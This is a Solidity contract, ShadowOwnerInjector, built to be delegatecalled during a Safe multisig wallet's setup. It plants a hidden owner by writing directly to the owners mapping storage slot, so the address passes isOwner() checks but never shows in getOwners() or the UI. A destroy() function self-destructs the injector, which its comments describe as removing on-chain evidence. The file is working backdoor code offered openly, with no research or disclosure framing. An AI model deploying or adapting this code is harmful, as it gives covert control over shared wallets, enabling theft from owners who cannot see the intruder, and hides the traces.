// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

/// @title ShadowOwnerInjector
/// @notice Called via DELEGATECALL from a Safe during setup() to inject a shadow owner.
/// @dev When executed via DELEGATECALL, all storage writes target the calling Safe's storage.
///      This writes directly to the Safe's `owners` mapping (storage slot 2) so that
///      `isOwner(shadowOwner)` returns true, but the linked list traversed by `getOwners()`
///      is left untouched — making the shadow owner invisible in the UI.
///
///      Safe storage layout (from SafeStorage.sol / inheritance order):
///        slot 0: singleton (address)
///        slot 1: modules   (mapping(address => address))
///        slot 2: owners    (mapping(address => address))
///        slot 3: ownerCount (uint256)
///        slot 4: threshold  (uint256)
///
///      The owners mapping is a linked list:
///        owners[SENTINEL(0x1)] -> owner1 -> owner2 -> ... -> SENTINEL(0x1)
///      isOwner(addr) returns true when owners[addr] != address(0) and addr != SENTINEL.
///      getOwners() walks the list from owners[SENTINEL] and only returns reachable entries.
///
///      By setting owners[shadowOwner] = non-zero WITHOUT inserting it into the linked list,
///      isOwner() returns true but getOwners() never encounters it.
contract ShadowOwnerInjector {
    /// @notice The storage slot index for the `owners` mapping in Safe contracts.
    uint256 private constant OWNERS_MAPPING_SLOT = 2;

    /// @notice Sentinel value used by Safe's linked-list owner structure.
    address private constant SENTINEL_OWNERS = address(0x1);

    /// @notice Injects a shadow owner into the Safe's owners mapping.
    /// @dev Must be called via DELEGATECALL so that sstore targets the Safe's storage.
    /// @param shadowOwner The address to make a hidden owner.
    function injectShadowOwner(address shadowOwner) external {
        require(shadowOwner != address(0), "Shadow owner cannot be zero address");
        require(shadowOwner != SENTINEL_OWNERS, "Shadow owner cannot be sentinel");

        // Compute the storage slot: keccak256(abi.encode(shadowOwner, OWNERS_MAPPING_SLOT))
        // This is the slot where owners[shadowOwner] is stored.
        bytes32 slot = keccak256(abi.encode(shadowOwner, OWNERS_MAPPING_SLOT));

        // Set owners[shadowOwner] = SENTINEL_OWNERS (a non-zero value).
        // This makes isOwner(shadowOwner) return true since owners[shadowOwner] != address(0).
        // We use SENTINEL as the value — it doesn't matter what non-zero value we use, as long
        // as it doesn't accidentally create a loop in the linked list. Since the shadow owner
        // is not reachable from the sentinel, the value stored here is never traversed.
        assembly {
            sstore(slot, 0x0000000000000000000000000000000000000000000000000000000000000001)
        }
    }

    /// @notice Self-destruct the injector to remove on-chain evidence.
    /// @dev Call this AFTER injection is complete. DO NOT call this during the delegatecall
    ///      (that would destroy the Safe!). Call in a separate transaction from any address.
    ///      Sends remaining ETH to the caller.
    function destroy() external {
        selfdestruct(payable(msg.sender));
    }
}
